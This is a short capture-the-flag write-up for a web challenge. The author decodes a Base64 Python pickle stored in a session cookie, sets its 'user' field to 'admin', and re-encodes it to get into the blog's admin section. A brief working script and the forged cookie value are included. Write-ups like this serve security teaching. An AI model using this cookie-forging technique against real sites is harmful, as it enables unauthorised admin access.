## Spotted Quoll Web 50

# Problem

This blog on Zombie research looks like it might be interesting - can you break into the /admin section?


# Solution

We get web page with quite simple interface:

![Spotted Quoll]
(assets/1.png)

We have no access to _Admin_


Quick look at request headers shows Cookie header contains long Base64 string:

![Spotted Quoll]
(assets/2.png)

String contains Python Pickle module object.

Couple of operations with Python allows us to:

- decode Base64 string to Pickle object
- unpack Pickle module
- modify 'user' key in dictionary to 'admin'
- pack it back into Pickle module and encode as Base64 

```Python
#!/usr/bin/python
import cPickle
import base64


c = cPickle.loads(base64.b64decode("KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"))
# {'python': 'pickles', 'subtle': 'hint', 'user': None}

n = {'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}

c2 = base64.b64encode(cPickle.dumps(n))

# KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKUydhZG1pbicKcDcKcy4=
```

Simple change of _obsoletePickle_ cookie allows us to access Admin and read the flag.

